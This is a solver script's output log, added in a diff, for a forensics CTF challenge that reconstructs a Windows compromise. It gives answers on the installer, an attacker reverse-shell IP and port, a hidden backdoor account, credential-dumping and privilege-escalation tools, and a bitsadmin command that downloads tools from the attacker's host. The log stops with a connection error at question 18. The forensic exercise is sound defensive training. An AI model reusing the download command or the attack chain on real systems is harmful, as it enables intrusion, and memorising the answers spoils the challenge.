@@ -1,0 +1,270 @@
+[x] Opening connection to gzcli.ctf.cyberjawara.id on port 62051
+[x] Opening connection to gzcli.ctf.cyberjawara.id on port 62051: Trying 108.136.134.163
+[+] Opening connection to gzcli.ctf.cyberjawara.id on port 62051: Done
+[*] Waiting for Question 1...
+================================================================================
+MEPHISTOPHELES
+================================================================================
+
+⚠️ This is a multi-episode investigation challenge!
+Complete all episodes to uncover the full attack chain.
+
+
+================================================================================
+📂 Episode I: The Responder First Day 📂
+================================================================================
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 1/25:
+────────────────────────────────────────────────────────────────────────────────
+The day of the compromise arrived from an installer downloads. Where is it downloaded from (Full URL)? What's the name of the file and when was the file downloaded successfully to the disk? (Answer with underscores concatenated respectively)
+
+💡 Format: http://jajar.baboi/M4Luwer.exe_M4Luwer.exe_10/28/2024 04:10:23 AM
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 1: https://cybersharing.net/api/download/file/8bd5ce87-b1d2-45a8-be68-03bc664ab068/7f203a93-4619-40f8-93c4-e075eb4d39dd/ea62a809-a93b-4a89-bfe1-33247f5058f8/AnsiArtInstaller.exe_AnsiArtInstaller.exe_12/21/2025 11:14:31 PM
+[*] Waiting for Question 2...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 2/25:
+────────────────────────────────────────────────────────────────────────────────
+When does the installer gets executed for the first time?
+
+💡 Format: 06/20/2021 10:23:14 AM
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 2: 12/21/2025 11:15:10 PM
+[*] Waiting for Question 3...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 3/25:
+────────────────────────────────────────────────────────────────────────────────
+There are two files dropped after the user executed the installer (exclude the shortcut). What are the names of the files (include their extensions with comma delimiters)?
+
+💡 Format: dorodoro.exe,mangekyo.exe
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 3: ansi_art.exe,program.banner
+[*] Waiting for Question 4...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 4/25:
+────────────────────────────────────────────────────────────────────────────────
+Where did these files are dropped in the victim machine?
+
+💡 Format: D:\Blataran\DirectoryName
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 4: C:\Users\Administrator\AppData\Local\Temp
+[*] Waiting for Question 5...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 5/25:
+────────────────────────────────────────────────────────────────────────────────
+There's a shortcut link file created as well. Where is this located in the victim's machine?
+
+💡 Format: D:\Blataran\Jeje.lnk
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 5: C:\Users\Administrator\Desktop\AnsiArt.lnk
+[*] Waiting for Question 6...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 6/25:
+────────────────────────────────────────────────────────────────────────────────
+It looks like there's a callback / backconnect / backdoor implemented but this is just a hypothesis for now. What's the attacker IP & port used?
+
+💡 Format: 10.12.41.23:9999
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 6: 192.168.100.157:443
+[*] Waiting for Question 7...
+Correct!
+
+================================================================================
+📂 Episode II: The Adversary Breadcrumbs 📂
+================================================================================
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 7/25:
+────────────────────────────────────────────────────────────────────────────────
+Upon compromising the machine, the attacker uploads certain files from its host to the victim's machine. What's the full local URL that host these files?
+
+💡 Format: http://172.16.1.10:5656
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 7: http://192.168.100.157:8082
+[*] Waiting for Question 8...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 8/25:
+────────────────────────────────────────────────────────────────────────────────
+Where do most of the uploaded files resided in the victim's machine? Please do provide the full path!
+
+💡 Format: D:\Blataran
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 8: C:\h1dd3n
+[*] Waiting for Question 9...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 9/25:
+────────────────────────────────────────────────────────────────────────────────
+The FIRST two files which attacker has uploaded to the victim's machine was leveraged by using a Living-Off-the-Land Binaries/Executable(s). One of the uploaded file was a secure deletion compressed file. Please do provide this full VALID command!
+
+💡 Format: D:\Blataran\harambe.exe galileo "jupri"
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 9: "C:\Windows\system32\bitsadmin.exe" /Transfer jarangoyang /priority foreground http://192.168.100.157:8082/SDelete.zip C:\h1dd3n\sadewa.zip
+[*] Waiting for Question 10...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 10/25:
+────────────────────────────────────────────────────────────────────────────────
+After unzipping these two files, what are the first OS command utility executed by the attacker?
+
+💡 Format: hostname
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 10: ipconfig
+[*] Waiting for Question 11...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 11/25:
+────────────────────────────────────────────────────────────────────────────────
+The attacker created an arbitrary user in the victim's machine, although there are several attempts. What are the final fixed user credentials that was used by the attacker? (Use underscores to distinguish the username and its password)
+
+💡 Format: juniper_p4ssw0rd
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 11: as3ng_AsengCupu123!
+[*] Waiting for Question 12...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 12/25:
+────────────────────────────────────────────────────────────────────────────────
+The attacker assigned the arbitrary user to 2 groups. What are those? Use comma delimiters to answer this question!
+
+💡 Format: Enterprise Admin Users,File Operators
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 12: administrators,Remote Desktop Users
+[*] Waiting for Question 13...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 13/25:
+────────────────────────────────────────────────────────────────────────────────
+After these actions done, when was the FIRST TIME that the attacker SUCCESSFULLY logins to the victim's machine using the arbitrary user credentials through RDP? (Answer in format MM/DD/YYYY HH:MM AM/PM)
+
+💡 Format: 06/15/2024 03:45 PM
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 13: 12/22/2025 12:02 AM
+[*] Waiting for Question 14...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 14/25:
+────────────────────────────────────────────────────────────────────────────────
+What is the modified executable file's name that was used from the attacker to perform a credential dumping? Please do provide the answer in form of full path!
+
+💡 Format: C:\Tools\credump.exe
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 14: C:\h1dd3n\mimiperi.exe
+[*] Waiting for Question 15...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 15/25:
+────────────────────────────────────────────────────────────────────────────────
+Besides the credential dumper executable, there's another uploaded malicious file that has a capability to exploit the Windows Access Token Privilege. What's this file's name on the victim's machine? Please do provide the answer in form of full path!
+
+💡 Format: C:\Malware\tokenhijack.exe
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 15: C:\h1dd3n\sassy.exe
+[*] Waiting for Question 16...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 16/25:
+────────────────────────────────────────────────────────────────────────────────
+What is the created named pipe from the prior/similar executable that is used to perform a privilege escalation that led to a successful reverse shell with NT Authority Context? Provide the full pipe name!
+
+💡 Format: \12345678-abcd-1234-ef00-123456789abc\pipe\winreg
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 16: \85985985-ddfa-430b-bf04-fc33fcfdc881\pipe\epmapper
+[*] Waiting for Question 17...
+Correct!
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 17/25:
+────────────────────────────────────────────────────────────────────────────────
+The prior reverse shell is leveraged from a known executable listener but the name is also modified in the victim's machine. What's the name of the changed file's name? Please do provide the answer in form of full path!
+
+💡 Format: C:\Tools\listener.exe
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 17: C:\h1dd3n\kucing.exe
+[*] Waiting for Question 18...
+Correct!
+
+================================================================================
+📂 Episode III: And I am Giving You the New Devil 📂
+================================================================================
+
+────────────────────────────────────────────────────────────────────────────────
+❓ Question 18/25:
+────────────────────────────────────────────────────────────────────────────────
+Let's recall back to our point zero where the compromises begins. Our focus now is on the installer and the dropped files. By looking back the question to HOW can the attacker compromise the victims' device, you have to reverse engineer them as there might be a hidden shellcode placed inside those. Please do provide the MD5 of the shellcode!
+
+💡 Format: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
+────────────────────────────────────────────────────────────────────────────────
+Answer: 
+[*] Sending answer for Question 18: 03db604a9686631b9d178cbdd6cac9d9
+[*] Waiting for Question 19...
+[ERROR] Connection closed unexpectedly.
+Traceback (most recent call last):
+  File "/home/sandwicheese/ctf-writeups/Cyber Jawara 2025 Quals/Forensics/Mephistopheles/solve.py", line 76, in solve
+    received = r.recvuntil(b"Answer: ").decode()
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/sandwicheese/.pyenv/versions/3.11.11/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
+    res = self.recv(timeout=self.timeout)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/sandwicheese/.pyenv/versions/3.11.11/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 106, in recv
+    return self._recv(numb, timeout) or b''
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/sandwicheese/.pyenv/versions/3.11.11/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 176, in _recv
+    if not self.buffer and not self._fillbuffer(timeout):
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/sandwicheese/.pyenv/versions/3.11.11/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
+    data = self.recv_raw(self.buffer.get_fill_size())
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/sandwicheese/.pyenv/versions/3.11.11/lib/python3.11/site-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
+    raise EOFError
+EOFError
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/sandwicheese/ctf-writeups/Cyber Jawara 2025 Quals/Forensics/Mephistopheles/solve.py", line 101, in <module>
+    solve()
+  File "/home/sandwicheese/ctf-writeups/Cyber Jawara 2025 Quals/Forensics/Mephistopheles/solve.py", line 79, in solve
+    log.error("Connection closed unexpectedly.")
+  File "/home/sandwicheese/.pyenv/versions/3.11.11/lib/python3.11/site-packages/pwnlib/log.py", line 439, in error
+    raise PwnlibException(message % args)
+pwnlib.exception.PwnlibException: Connection closed unexpectedly.
+[*] Closed connection to gzcli.ctf.cyberjawara.id port 62051
